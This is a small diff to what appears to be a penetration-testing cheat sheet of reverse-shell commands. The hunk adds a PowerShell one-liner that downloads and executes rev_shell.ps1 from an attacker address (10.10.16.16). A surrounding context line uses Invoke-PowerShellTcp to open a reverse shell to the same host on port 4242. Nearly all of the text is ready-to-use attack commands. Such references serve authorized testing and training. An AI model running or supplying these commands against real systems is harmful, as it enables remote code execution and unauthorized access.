@@ -420,6 +420,10 @@ https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-Power
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.16:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.16 -Port 4242
 ```
 
+```
+powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.16/rev_shell.ps1\");
+```
+
 ### Awk
 
 ```powershell
